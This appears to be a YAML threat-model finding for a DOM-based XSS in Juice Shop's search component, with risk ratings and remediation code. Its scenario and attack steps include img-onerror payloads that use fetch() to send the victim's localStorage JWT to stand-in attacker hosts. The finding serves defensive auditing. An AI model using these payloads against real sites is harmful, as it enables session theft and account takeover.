- local_id: frontend-spa-002
  threat_category_id: TH-11
  additional_categories: []
  stride: Tampering
  cwe: CWE-79
  title: DOM-Based Cross-Site Scripting — search-result.component.ts:143
  affected_parameter: q
  scenario: 'In `search-result.component.ts:143`, the URL query parameter `?q=` is read from the Angular route snapshot at
    line 136 and passed verbatim to `this.sanitizer.bypassSecurityTrustHtml(queryParam)`. Angular''s automatic HTML sanitizer
    is explicitly disabled here, and the value is bound to an inner-HTML rendering context. An attacker crafts a URL like
    `/#/search?q=<img src=x onerror=fetch(''//''+''evil.example/?t=''+localStorage.getItem(''token''))>` and delivers it to
    a victim. Opening the link causes the injected event handler to fire in the Juice Shop origin, exfiltrating the JWT stored
    in localStorage (see frontend-spa-004). This is a direct attack chain: reflected DOM-XSS plus localStorage token exposure
    equals full session hijack in a single click.'
  attack_steps:
  - An attacker crafts a URL such as `/#/search?q=<img src=x onerror='fetch(`//attacker.example/?t=`+localStorage.getItem(`token`))'>`
    and delivers it to a victim via email, chat, or a shortened link.
  - The victim opens the link; Angular's router sets `queryParam` to the payload, and `search-result.component.ts:143` calls
    `bypassSecurityTrustHtml(queryParam)`, injecting the `<img>` tag into the live DOM.
  - The injected event handler executes in the Juice Shop origin, reads `localStorage.getItem('token')`, and transmits the
    JWT to the attacker-controlled server.
  evidence_summary: search-result.component.ts:143 passes the URL `?q=` parameter directly to `bypassSecurityTrustHtml`, explicitly
    disabling Angular's HTML sanitizer before rendering the value as innerHTML.
  impact_description: A single crafted link delivers reflected DOM-XSS that steals the victim's JWT and basket session ID,
    enabling full account takeover without any further authentication.
  likelihood: High
  impact: High
  risk: High
  controls_in_place: Angular template auto-escaping protects `{{ }}` interpolation contexts. The vulnerability is introduced
    by explicitly calling `bypassSecurityTrustHtml` to override this protection on the search query parameter.
  mitigation_title: Remove bypassSecurityTrustHtml from search-result and bind query output via safe Angular template interpolation
  remediation:
    effort: Low
    steps:
    - Replace `this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)` at line 143 with `this.searchValue =
      queryParam` (a plain string). In the component template, use `{{ searchValue }}` (text interpolation) instead of `[innerHTML]`
      to restore Angular's built-in auto-escaping.
    - If rich formatting in the search highlight is required, use `this.sanitizer.sanitize(SecurityContext.HTML, queryParam)`
      which applies Angular's allowlist-based HTML cleaner rather than bypassing it entirely.
    - 'Add a `Content-Security-Policy: default-src ''self''; script-src ''self''` header at the Express server layer (e.g.,
      via `helmet.contentSecurityPolicy()`) as defence-in-depth to block exfiltration even if another bypass path exists.'
    code_example: '// BEFORE (search-result.component.ts:143):

      this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam) // XSS


      // AFTER — restore Angular''s auto-escaping:

      this.searchValue = queryParam  // bind via {{ searchValue }} in template, not [innerHTML]'
    verification: Navigate to `/#/search?q=<img src=x onerror=alert(1)>` — the browser must NOT fire the alert. The `<img>`
      tag should appear as escaped text or be stripped entirely.
    reference: CWE-79
  evidence:
